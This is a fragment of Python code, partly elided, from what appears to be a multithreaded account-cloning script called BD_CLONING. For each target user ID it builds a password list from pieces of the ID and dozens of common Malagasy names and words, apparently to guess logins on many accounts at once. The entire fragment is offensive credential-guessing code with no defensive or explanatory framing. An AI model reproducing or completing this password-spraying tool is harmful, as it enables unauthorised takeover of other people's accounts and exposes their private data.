...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'malala','Malala','felana','Felana','mahery','Mahery','fitiavana','Fitiavana','mamako','Mamako','zanako','Zanako','papako','Papako','mamiko','Mamiko','fanilo','Fanilo','faniry','Faniry','mahandry','Mahandry','nirina','Nirina','safidy','Safidy','fandresena','Fandresena','mahefa','Mahefa','nilaina','Nilaina','sarika','Sarika','milely','Milely','fiderana','Fiderana','valisoa','Valisoa','valimbavaka','Valimbavaka','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra']
